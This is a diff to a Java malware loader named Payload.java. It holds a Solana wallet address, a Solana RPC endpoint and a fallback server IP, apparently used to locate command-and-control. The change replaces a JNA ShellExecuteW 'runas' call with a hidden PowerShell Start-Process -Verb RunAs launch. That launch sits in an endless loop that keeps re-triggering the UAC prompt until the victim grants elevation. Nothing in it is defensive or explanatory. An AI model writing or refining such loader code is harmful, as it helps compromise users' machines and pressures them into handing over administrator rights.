@@ -1,5 +1,4 @@
 // language: Java, file: payload/Payload.java
-import com.sun.jna.*;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -8,11 +7,6 @@ import java.util.Base64;
 import java.util.zip.*;
 
 public class Payload {
-    public interface Shell32 extends Library {
-        Shell32 INSTANCE = Native.load("shell32", Shell32.class);
-        int ShellExecuteW(Pointer hwnd, String lpOperation, String lpFile, String lpParameters, String lpDirectory, int nShowCmd);
-    }
-
     private static final String SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
     private static final String SOLANA_RPC = "https://api.devnet.solana.com";
     private static final String FALLBACK_SERVER = "95.182.96.216";
@@ -153,36 +147,44 @@ public class Payload {
         try {
             String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
             String javaExe = javaHome + "\\bin\\javaw.exe";
-            String javaBinDir = javaHome + "\\bin";
             String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
             File lockFile = new File(getLoaderDir(), ".lock");
 
             log("java: " + javaExe);
             log("jar: " + jarPath);
 
-            String cmdArgs = String.format("-jar \"%s\" %s %s", jarPath, key, ip);
-            
+            // Launch via cmd.exe /c start to force the UAC prompt onto the visible desktop
+            String psCommand = String.format(
+                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
+                javaExe, jarPath, key, ip
+            );
+            String cmdLine = "cmd.exe /c start \"\" powershell.exe -NoProfile -WindowStyle Hidden -Command \"" + psCommand + "\"";
+
             FileOutputStream lockStream = new FileOutputStream(lockFile);
 
             while (true) {
-                log("Triggering UAC...");
+                log("Triggering UAC via cmd/start...");
                 
-                // Pass javaExe WITHOUT quotes, but set the working directory (javaBinDir) so Windows finds it
-                int result = Shell32.INSTANCE.ShellExecuteW(null, "runas", javaExe, cmdArgs, javaBinDir, 1);
+                Process p = Runtime.getRuntime().exec(cmdLine);
+                p.waitFor(); 
                 
-                if (result > 32) {
-                    log("UAC Accepted. Waiting for elevated process...");
-                    for (int i = 0; i < 150; i++) {
-                        if (!lockFile.exists() || lockFile.delete()) {
-                            log("Elevated process confirmed. Parent exiting.");
-                            lockStream.close();
-                            System.exit(0);
-                        }
-                        Thread.sleep(100);
+                // Wait for the elevated process to delete the lock file
+                boolean accepted = false;
+                for (int i = 0; i < 100; i++) { 
+                    if (!lockFile.exists() || lockFile.delete()) {
+                        accepted = true;
+                        break;
                     }
+                    Thread.sleep(100);
+                }
+                
+                if (accepted) {
+                    log("UAC Accepted. Parent exiting.");
+                    lockStream.close();
+                    System.exit(0); 
                 } else {
-                    log("UAC Denied (Code: " + result + "). Instantly retrying...");
-                    Thread.sleep(250); 
+                    log("UAC Denied. Instantly retrying...");
+                    Thread.sleep(100);
                 }
             }
         } catch (Exception e) {
